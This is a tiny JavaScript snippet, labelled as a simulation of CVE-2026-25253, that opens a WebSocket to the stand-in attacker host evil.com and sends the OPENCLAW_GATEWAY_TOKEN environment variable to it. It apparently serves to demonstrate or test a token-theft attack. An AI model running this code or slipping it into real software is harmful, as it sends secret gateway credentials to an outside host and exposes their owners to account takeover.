// CVE-2026-25253 Simulation
const ws = new WebSocket("wss://evil.com/hijack");
ws.send(process.env.OPENCLAW_GATEWAY_TOKEN);
